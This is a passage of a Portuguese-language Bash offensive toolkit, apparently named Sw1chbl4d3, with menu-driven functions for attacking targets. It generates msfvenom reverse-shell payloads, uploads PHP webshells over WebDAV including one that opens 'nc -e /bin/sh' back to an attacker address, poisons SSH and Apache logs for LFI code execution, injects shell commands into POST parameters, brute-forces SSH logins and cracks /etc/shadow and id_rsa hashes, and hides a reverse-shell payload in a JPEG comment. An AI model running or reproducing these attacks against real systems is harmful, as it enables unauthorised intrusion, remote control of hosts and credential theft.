    14)# Reverse HTTPs Apk
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$porta R > shellHTTPs.apk
    ;; 
    15)# Reverse TCP Apk
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta R > shellTCP.apk
    ;; 
    16)# Reverse TCP macOS x86
	echo "Digite o IP Reverso"
	read -e ip
	echo "Digite a Porta Reversa"
    read -e porta
    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$porta -f macho > shell.macho
    esac
}

dirsearch1()
{
    # dirsearch 
    echo "1) Procura normal"
    echo "2) Procura Recursiva"
    echo "3) Procura de Arquivos or Pastas"
    read -e -p 'Opcao: ' resp8
    echo
            
	case $resp8 in

	1)# Procura normal
    echo "Digite o Dominio/pasta alvo:"
    read -e ip
    echo "Digite status para excluir Ex: 403,500"
    read -e status
    echo "Digite Tipos de as extensÃ£o (php,txt,cgi)"
    read -e opgobuster
    echo "Digite o caminho da wordlist ou Enter"
    read -e wordlista3
    if [ "$opgobuster" == "" ]
  	then
  	    if [ "$wordlista3" == "" ]
  	    then
  	        if [ "$status" == "" ]
  	        then
	            dirsearch -f -e $opgobuster1 -u $ip -w $arquivosbrute -t 80
	        else
	            dirsearch -f -e $opgobuster1 -u $ip -w $arquivosbrute -x $status -t 80
	        fi
	    else
	        if [ "$status" == "" ]
  	        then
                dirsearch -f -e $opgobuster1 -u $ip -w $wordlista3 -t 80
	        else
                dirsearch -f -e $opgobuster1 -u $ip -w $wordlista3 -x $status -t 80     
	        fi
		                        
	    fi      
	else
        if [ "$wordlista3" == "" ]
  	    then
  	        if [ "$status" == "" ]
  	        then
		        dirsearch -f -e $opgobuster -u $ip -w $arquivosbrute -t 80 
		    else
		        dirsearch -f -e $opgobuster -u $ip -w $arquivosbrute -x $status -t 80
		    fi
		else
		    if [ "$status" == "" ]
  	        then
		        dirsearch -f -e $opgobuster -u $ip -w $arquivosbrute -t 80 
		    else
		        dirsearch -f -e $opgobuster -u $ip -w $wordlista3 -x $status -t 80
		    fi     
		fi    
    fi
    ;;
  
    2)# Procura Recursiva
    echo "Digite o IP/pasta ou Dominio/pasta alvo:"
    read -e ip
    echo "Digite os status para excluir Ex: 403,500"
    read -e status
    echo "Digite os Tipos de as extensÃ£o (php,txt,cgi)"
    read -e opgobuster
    echo "Digite o caminho da wordlist ou Enter"
    read -e wordlista3
    if [ "$opgobuster" == "" ]
  	then
  	    if [ "$wordlista3" == "" ]
  	    then
  	        if [ "$status" == "" ]
  	        then
	            dirsearch -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -t 80
	        else
	            dirsearch -r -u $ip -w $arquivosbrute -f -e $opgobuster1 -x $status -t 80
	        fi
	    else
	        if [ "$status" == "" ]
  	        then
  	            dirsearch -r -u $ip -w $wordlista3 -f -e $opgobuster1 -t 80
  	        else
	            dirsearch -r -u $ip -w $wordlista3 -f -e $opgobuster1 -x $status -t 80
	        fi     
	    fi      
	else
        if [ "$wordlista3" == "" ]
  	    then
  	        if [ "$status" == "" ]
  	        then
		        dirsearch -r -u $ip -w $arquivosbrute -f -e $opgobuster -t 80
		    else
		        dirsearch -r -u $ip -w $arquivosbrute -f -e $opgobuster -x $status -t 80
		    fi     
		else
		    if [ "$status" == "" ]
  	        then
		        dirsearch -r -u $ip -w $wordlista3 -f -e $opgobuster -t 80
		    else
		        dirsearch -r -u $ip -w $wordlista3 -f -e $opgobuster -x $status -t 80
		    fi     
		fi    
    fi 
    ;;
  
    3)# Procura de Arquivos
    echo "Digite o IP/pasta ou Dominio/pasta alvo:"
    read -e ip
    echo "Digite os status para excluir Ex: 403,500"
    read -e status
    if [ "$status" == "" ]
  	then
  	    dirsearch -u $ip -w $arquivos2 -t 80
	else
        dirsearch -u $ip -w $arquivos2 -t 80
	fi            
    esac	    
}     

portscan()
{
    # PortScan
    echo "Digite o IP"
    read -e ip
    echo "Digite o Intervalo de porta Ex: 1 65535"
    read -e int
    for port in $(seq $int);do
    2>/dev/null echo > /dev/tcp/$ip/$port
    if [ $? == 0 ]
    then
        echo "Open:$port"
    fi
    done 
    
}

analmetodos()
{
    # Analisando Metodos HTTP 
    echo "Digite o dominio/pasta ex: https://192.168.1.1/pasta"
    read -e ip
    echo "Digite o Metodo HTTP ex: OPTIONS"
    read -e metodo
    curl -X $metodo $ip 	
    
}

webdav()
{
   # Injetando webshell.php WEBDAV 
    echo "1) Executar comandos do sistema webshell.php WEBDAV"
	echo "2) Shell Reverse com nc"
	echo "3) Teste automatizado Davtest"
	echo "4) Conectar webdav - cadaver"
    read -e -p 'Opcao: ' resp5
    echo
	case $resp5 in
	   
	1)# Executar comandos sistema - Injetando webshell.php WEBDAV  
    echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
    read -e ip
    echo "Digite o Comando (ex: id)"
    read -e comando
	echo
    curl -X PUT -d "<?php%20system('$comando');?>" $ip/webshell.php
    curl -s -X GET $ip/webshell.php | egrep -v "<"
    ;;

    2)# Injetando webshell.php WEBDAV  
    echo "Lembre-se de ouvir a porta Reversa"
    echo
    echo "Digite o IP or Dom/Pasta Alvo Ex: 192.168.1.5/dav"
    read -e ip
    echo "Digite o IP reverso"
    read -e ipreverso
    echo "Digite a Porta Reversa"
    read -e porta
    echo
    curl -s -X PUT -d "<?php%20system('nc -e /bin/sh $ipreverso $porta');?>" http://$ip/webshell.php
    curl -s -X GET http://$ip/webshell.php
    ;;
            
    3)# Testar WebDav - davtest  
    echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
    read -e ip
    davtest --url http://$ip/
    ;;         
                    
    4)# Conectar no WEBDAV - Cadaver  
    echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
    read -e ip
    cadaver http://$ip/
    ;;
              
    5)# WebShell Reversa PHP  - ShellScript  
    echo "Digite o IP or Dom/Pasta Ex: 192.168.1.5/dav"
    read -e ip
    curl -X PUT http://$ip/ --upload-file webshell2.php
    curl -X GET http://$ip/webshell2.php              
    esac
}


estefanografia()
{
    # Esteganografia 
    echo "1) Esconder Arquivo em Foto .jpg"
	echo "2) Extrair Arquivo de Foto .jpg"
    
    read -e -p 'Opcao: ' resp6
    echo
	case $resp6 in
	   
	1)# Esconder Arquivo em Foto .jpg  
    echo "Digite o caminho do .jpg ex: /home/foto.jpg"
    read -e jpg
	echo "Digite o caminho do arquivo a esconder ex: /home/arq.sh"
    read -e arquivo
	echo "Digite o nome do arquivo final ex: arquivo"
    read -e nomearquivo
    steghide embed -cf $jpg  -ef $arquivo -sf $nomearquivo.jpg
                                      
    ;;

    2)# Extrair Arquivo de Foto .jpg 
    echo "Digite o caminho do .jpg ex: /home/foto.jpg"
    read -e jpgext
    steghide extract -sf $jpgext
    esac
}

brutefoce()
{
    # Brute Force 
    echo "1) Brute de Hash por Formato"
	echo "2) Brute SSH Hydra"
    echo "3) Brute Hash - hashCat"
	echo "4) Brute Hydra Protocolos"
    echo "5) Brute de Hash Linux etc/shadow"
	echo "6) Brute id_rsa SSH"
	echo "7) Brute de Hash Linux"
    read -e -p 'Opcao: ' resp6
    echo
	case $resp6 in
	   
	1)# Brute de Hash por Formato
    echo "Digite o Caminho do arquivo Hash ex: /home/hash.txt"
    read -e Hash
	echo "Digite o Formato do Hash"
    read -e formato
	echo "Digite o caminho da wordlist ou Enter"
    read -e wordlista2
    if [ "$wordlista2" == "" ]
	then
	    john --format=$formato --wordlist=$wordlista $hash
	    john $hash --show
	else
	john --format=$formato --wordlist=$wordlista2 $hash
	john $hash --show
    fi
    ;;

    2)# Brute SSH Hydra  
    echo "Digite o IP alvo"
    read -e ip
    echo "Digite l=usuario ou L=lista ex: L"
    read -e lista
    echo "Digite o usuario ou caminho Lista"
    read -e usuario
    echo "Digite p=senha ou P=listaSenha Ex: P"
    read -e listasenha
	if [ "listasenha" == "P" ]
	then
        echo "Digite o caminho da wordlista"
        read -e wordlista5
	    hydra -$lista $usuario -$listasenha $wordlista5 ssh://$ip
	else
	    echo "Digite a Senha"
	    read -e senha
		hydra -$lista $usuario -$listasenha $senha ssh://$ip
    fi
    ;;

    3)# Brute Hash - hashCat
    echo "Digite o caminho do arquivo hash"
    read -e hash1
    echo "Digite o numero do formato do Hash ex: 100"
    read -e numero
    echo "Digite o caminho da wordlist ou Enter"
    read -e wordlist6
    if [ "wordlist6" == "" ]
    then
        hashcat -m $numero $hash1 $wordlista
    else
        hashcat -m $numero $hash1 $wordlista6
    fi 
    ;;

    4) #  Brute Hydra Protocolos 
    echo "Digite o Usuario ou caminho da Lista"
    read -e usuario
    echo "Digite l=usuario L=lista ex: L"
    read -e lista
    echo "Digite p=senha ou P=listasenha ex: P"
    read -e senhas
	echo "Digite a senha ou caminho da wordlist ou Enter"
    read -e listasenhas
    echo "Digite o IP Alvo"
    read -e ip
    echo "Digite o Protocolo ex: smb"
    read -e protocolo
    echo "Digite a porta"
    read -e porta
    if [ "$listasenhas" == "" ]
	then
        hydra -v -$lista $usuario -$senhas $wordlista $ip $protocolo -s $porta   	 	
	else
        hydra -v -$lista $usuario -$senhas $listasenhas $ip $protocolo -s $porta
    fi                         
    ;;
 
    5)# Brute de Hash Linux etc/shadow  
    echo "Digite o caminho do Passwd"
    read -e passwd2
    echo "Digite o caminho do Shadow"
    read -e shadow2
    echo "Digite o Caminho da Wordlist ou Enter"
    read -e wordlista5 
    unshadow $passwd2 $shadow2 > hashlinux.txt
    if [ "$wordlista5" == "" ]
	then
        john hashlinux.txt --wordlist=$wordlista
        john hashlinux.txt --show   	 	
	else
        john hashlinux.txt --wordlist=$wordlist5
        john hashlinux.txt --show 
    fi
    ;;

    6)# Brute id_rsa SSH  
    echo "Digite o caminho do id_rsa ex: /home/user/.ssh/id_rsa "
    read -e id_rsa 
    echo "Digite o Caminho da Wordlist ou Enter"
    read -e wordlista5
    /usr/share/john/ssh2john.py $id_rsa > id_rsa.txt
    if [ "$wordlista5" == "" ]
	then
        john id_rsa.txt --wordlist=$wordlista
        john id_rsa.txt --show 	
	else
        john id_rsa.txt --wordlist=$wordlista5 
        john id_rsa.txt --show
    fi
    ;;               
    7)# Brute HASH linux 
    echo "Digite o caminho do HASH ex: /home/user/hash.tx"
    read  -e hash2
    echo "Digite o Caminho da Wordlist ou Enter"
    read -e wordlista5
    if [ "$wordlista5" == "" ]
	then
        john $hash2 --wordlist=$wordlista
        john $hash2 --show 	
	else
        john $hash2 --wordlist=$wordlista5 
        john $hash2 --show
    fi               
    esac
}


inflog()
{
    # Infeccao de Log SSH - LFI linux 
    echo "1) Infectando Log SSH - LFI"
    echo "2) Infectando Log APACHE2 - LFI"
    echo "3) Explorando Infec Log SSH - LFI"
    echo "4) Explorando Infec Log APACHE2 - LFI"
    read -e -p 'Opcao: ' resp12
    echo
	case $resp12 in
	  
    1)# Infectando Log SSH - LFI
	echo "Digite o IP do Alvo"
    read -e ip
    echo "Aguarde..erre a senha 3 vezes.."
    echo teste |  ssh '<?php system($_GET["sw1tchbl4d3"]); ?>'@$ip
	;;
	   
	   
	2)# Infectando Log Apache2 - LFI
	echo "Digite o IP do Alvo"
    read -e ip
    echo "Digite a porta"
    read -e porta
    echo "Espere conectar !! copie e cole o codigo"
    echo "<?php%20system($_GET['sw1tchbl4d3']);%20?>" 
    nc -v $ip $porta -C
    ;;

	3)# Explorando Infec Log SSH - LFI
    echo "Digite o local com LFI ex: domino/arquivo.php?="
	read -e local2
    echo "Digite o comando Ex: ls%20-la"
	read -e comando
    echo "Aguarde..."
    mes=$(curl -s -X GET "$local2../../../../../../../var/log/auth.log" | awk 'NR==1{print $1 ; }') 
    resposta=$(curl -s -X GET "$local2../../../../../../../var/log/auth.log&sw1tchbl4d3=$comando" | egrep -v "$mes|from" | sort | uniq )
	echo "Comando executado..."
    echo "-----------------------------------------------------------" 
    echo "$resposta" 
    ;;
    
	4)# Explorando Infec Log Apache - LFI
    echo "Digite o local com LFI ex: domino/arquivo.php?="
	read -e local2
    echo "Digite o comando Ex: ls%20-la"
	read -e comando
    echo "Aguarde..."
    curl -s -X GET "$local2../../../../../../../var/log/apache2/access.log&sw1tchbl4d3=$comando" | egrep -v "<"
    echo "Comando executado..."
    echo "-----------------------------------------------------------" 
    esac
}
    
googlehack()
{	
	#  Google Hack 
    echo "1) Instalar o Lynx"
    echo "2) Google Hack"
    read -e -p 'Opcao: ' resp11
    echo
	case $resp11 in
	    
    1)# Google Hack
    apt update
    apt install lynx
    ;;

	2)# Google Hack
    echo "Digite o dominio"
    read -e dominio
    echo "Digite a extensao"
    read -e extensao
    lynx --dump "http://google.com/search?num=100&q=site:"$dominio"+ext:"$extensao"" | cut -d "=" -f2 | grep ".$extensao" | egrep -v "site|google" | sed s'/...$//'g
    esac
}

gerarwordlist()
{
    # Gerando Wordlista Personalizada 
    echo "Cuidado ao criar wordlist com muitos caracters, ficara enorme"
    echo 
    echo "1) Gerando wordlist letras minusculas e maiusculas"
	echo "2) Gerando wordlist por sequencia de caracteres"
    echo "3) Gerando wordlist letras minusculas/maiusculas e numeros"
	echo "4) Gerando wordlist letras minusculas/maiusculas"
    echo "5) Procurar Senha em Worlists"
    echo "6) Gerador de Senhas"
    echo "7) Mutacao de Worlists"
    echo "8) Gerar wordlist por Dominio"
    read -e -p 'Opcao: ' resp7
    echo
	case $resp7 in
	   
	1)# Gerando Letras Minusculas e Maiusculas
    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
    read -e quantidadecara
	echo "Digite um nome para o Arquivo"
    read -e nomearquivo
    crunch $quantidadecara $quantidadecara -f $listaAlha mixalpha -o $nomearquivo.txt
    ;;
 
	2)# Criando WordList por Sequencia de Caracteres
    echo "Digite uma Palavra use @ por caractere a modificar Ex: @C@rl@s@@"
	read -e palavra
    echo "Digite a Sequencia Caracteres ex: 01234567890"
    read -e sequencia
    echo "Digite um nome para Wordlist"
    read -e nomewordlist
    echo -n $palavra > tamanhopalavra.txt
    wc -c tamanhopalavra.txt | cut -d " " -f1 > numero.txt
    numero=$(cat numero.txt)
    crunch $numero $numero $sequencia -t $palavra -o $nomewordlist.txt                    
    ;;

    3)# Gerando Letras Minusculas , Maiusculas e Numeros
    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
    read -e quantidadecara
    echo "Digite l=minuscula u=maiuscula ex: u"
    read -e mm
	echo "Digite um nome para o Arquivo"
    read -e nomearquivo
    crunch $quantidadecara $quantidadecara -f $listaAlha "$mm""alpha-numeric" -o $nomearquivo.txt
    ;;

    4)# Gerando Letras Minusculas e Maiusculas
    echo "Qual a quantidade de Caracteres na Wordlist ex: 6"
    read -e quantidadecara
    echo "Digite l=minuscula u=maiuscula (ex: u)"
    read -e mm
	echo "Digite um nome para o Arquivo"
    read -e nomearquivo
    crunch $quantidadecara $quantidadecara -f $listaAlha "$mm""alpha" -o $nomearquivo.txt
    ;;

    5)# Procurar Senha em Worlists
    echo "Digite a senha que Procura"
	read -e senha
    echo "Aguarde..."
    grep -r "$senha" /usr/share/seclists/Passwords/* /usr/share/wordlists/* | cut -d ":" -f1  | sort | uniq 
    ;;

    6)# Gerador de Senhas
    echo " 0 = Senhas sem numeral "
    echo " A = Senhas sem maiusculas"
    echo " c = Senhas com ao menos uma maiuscula"
    echo " n = Senhas numericas"
    echo " s = Senhas seguras"
	echo " y = Senhas com simbolos"
	echo " B = ambiguous"
    echo
    echo "Digite a quantidade de Caracteres Ex: 14"
    read -e qtdcarac
    echo "Digite a quantidade de Senhas a Criar Ex: 6"
    read -e qtdsenhas
    echo "Combine as opcoes Ex: Bcnsy"
    read -e opcoes
    echo "_____________________________________________"
    pwgen -$opcoes $qtdcarac $qtdsenhas 
    ;;

    7)# Mutacao de Worlists - OK
    echo "Digite o caminho da wordlista para mutacao"
	read -e mutacao
    echo "Digite o nome para Nova Wordlist"
    read -e wordlistmutacao
    john --wordlist=$mutacao --rules --stdout > $wordlistmutacao.txt
    ;;
 
    8)# Gerar wordlist por Dominio - OK testar dnvo
    echo "Digite o dominio base da Wordlist ex: https://www.google.com"
    read -e url
    echo "Digite um nome para sua Wordlist ex: lista"
    read -e wordlista
    cewl $url -m 4 -d 5 > $wordlista.txt
    cat $wordlista.txt
    esac                           
 }
 
bughunter()
{ 

    echo "Modulo de RECON - ATACK - BugHunter"
    echo	
    echo "Digite o dominio"
    read -e dominio
    mkdir $dominio
    cd $dominio
    echo "Procurando Dominios e Subdominios"
    subfinder -d $dominio -silent | httpx -silent | xargs -I@ findomain -t @ -q --pscan | tee -a domainTakeOver 
    ex -s -c '%s/ //e|%s/]//e|x' domainTakeOver
    awk -F "," '{print $1}' domainTakeOver > dominios 
    awk -F "[" '{print $2}' domainTakeOver > portas
    echo "gauplus";awk '{print $1}' dominios | gauplus -random-agent -t 25 -b ttf,woff,svg,png,jpg | tee -a links
    echo "qsreplace";cat links | qsreplace | tee -a links2 
    echo "procurando js e json";awk '/\.js|\.json/ {print $1}' links2 > json_files 
    echo "procurando paramentos";awk '/\=/ {print $1}' links2 | tee -a ssrf sqli xss lfi idor redirect rce
    echo "MOdulo de Ataque com Nuclei";nuclei -update;nuclei -ut
    nuclei -c 70 -severity critical,medium,high,low -l dominio | tee -a result-nuclei.txt
    sleep 5
	echo "Modulo de ataque com dalfox"
	cat links2 | egrep "\=|\?|\/" | dalfox pipe -silent | tee -a result-dalfox.txt
}
xsstrike1()
{
    #  XSStrike
    echo "1) XSS Teste de Paramentro"
	echo "2) XSS Localizar Parametro"
    echo "3) Self-XSS"
    echo "Opcao:"
    read -e resp26
    echo
	case $resp26 in
	    
	1)# XSS Teste de Paramentro  
    echo "Digite o caminho do parametro ex: http://turismo/procurar.php/?busca="
    read -e xssp
	python3 $xsstrike -u "$xssp"
    ;;

    2)# XSS Localizar Parametro 
    echo "Digite o caminho ex: http://turismo/procurar.php"
    read -e xsslp
    python3 $xsstrike -u "$xsslp" --params
    ;;

    3)# Self-XSS 
    echo "Digite o caminho ex: http://turismo/procurar.php/"
    read -e sxss
    python3 $xsstrike -u "$sxss" --path
    esac
}

paramspider1()
{
    #  ParamSpider
    echo "Digite o Dominio ex:http://site.com.br"
    read -e dominio
    python3 $parampp -d "$dominio"
}

commixpost()
{
    echo "Modulo do commix POST"
    echo "Digite o local do CMI ex: http://site.com.br/whois/"
    read -e dominio
    echo "Digite o parametro Ex: site="
    read -e parametro
    python3 $commix --url $dominio --data="$parametro" security=low
}

comandinjepost()
{
    # command Injection POST
    echo "Digite o local do CMI ex: http://site.com.br/whois/"
    read -e dominio
    echo "Digite o parametro Ex: site="
    read -e parametro
    echo "Digite o comando"
    read -e comando
    curl -s -X POST -d "$parametro;$comando; #" $dominio | grep -v "<"
}

searchsploit1()
{
    # Procurar exploit 
    echo "1) Procurar exploit"
    echo "2) Baixar exploit"
    read -e -p 'Opcao: ' resp12
    echo
	case $resp12 in
	  
    1)# Procurar exploit
	echo "Digite o que procura Ex: eternalblue"
    read -e procura
    searchsploit -s $procura
	;;
    2)# Baixar exploit
	echo "Digite o caminho para baixar Ex: windows/remote/42031.py"
    read -e baixar
    searchsploit -m $baixar
	esac
}

exiftool1()
{
    # Criar imagem, com infeccao codigo PHP no comentario
	echo "Digite o IP para conexao reversa"
	read -e ip
	echo "Digite a porta para conexao reversa"
	read -e porta
	cp foto.jpg foto2.jpg
    exiftool -Comment='<?php system("nc $ip $porta -e /bin/bash"); ?>' foto2.jpg
}

if [ -z "$1" ]
then
    banner2
    banner
	echo "Use: ./Sw1chbl4d3-v3.0.sh Opcao"
	echo "Ex: ./Sw1chbl4d3-v3.0.sh 1"
elif [ $1 == "1" ]
then
    banner3
    nmap1
elif [ $1 == "2" ]
then
    banner3
    gobuster1
elif [ $1 == "3" ]
then
    banner3
    wpscan1
elif [ $1 == "4" ]
then
    banner3
    sqlmap1
elif [ $1 == "5" ]
then
    banner3
    dns1
elif [ $1 == "6" ]
then
    banner3
    joomscan1
elif [ $1 == "7" ]
then
    banner3
    clondom
elif [ $1 == "8" ]
then
    banner3
    whateb1
elif [ $1 == "9" ]
then
    banner3
    waf1
elif [ $1 == "10" ]
then
    banner3
    sslscan1
elif [ $1 == "11" ]
then
    banner3
    brutesubdom
elif [ $1 == "12" ]
then
    banner3
    ftp1
elif [ $1 == "13" ]
then
    banner3
    transzona
elif [ $1 == "14" ]
then
    banner3
    onesixtyone1
elif [ $1 == "15" ]
then
    banner3
    enum4linux1
elif [ $1 == "16" ]
then
    banner3
    searchsploit1
elif [ $1 == "17" ]
then
    banner3
    lfil
elif [ $1 == "18" ]
then
    banner3
    convbases
elif [ $1 == "19" ]
then
    banner3
    pingsweep
elif [ $1 == "20" ]
then
    banner3
    netbios1
elif [ $1 == "21" ]
then
    banner3
    msfvenon1
elif [ $1 == "22" ]
then
    banner3
    dirsearch1
elif [ $1 == "23" ]
then
    banner3
    portscan
elif [ $1 == "24" ]
then
    banner3
    analmetodos
elif [ $1 == "25" ]
then
    banner3
    webdav
elif [ $1 == "26" ]
then
    banner3
    estefanografia
elif [ $1 == "27" ]
then
    banner3
    brutefoce
elif [ $1 == "28" ]
then
    banner3
    inflog
elif [ $1 == "29" ]
then
    banner3
    googlehack
elif [ $1 == "30" ]
then
    banner3
    gerarwordlist
elif [ $1 == "31" ]
then
    banner3
    bughunter
elif [ $1 == "32" ]
then
    banner3
    xsstrike1
elif [ $1 == "33" ]
then
    banner3
    paramspider1
elif [ $1 == "34" ]
then
    banner3
    commixpost
elif [ $1 == "35" ]
then
    banner3
    comandinjepost
elif [ $1 == "36" ]
then
    banner3
    exiftool1
fi

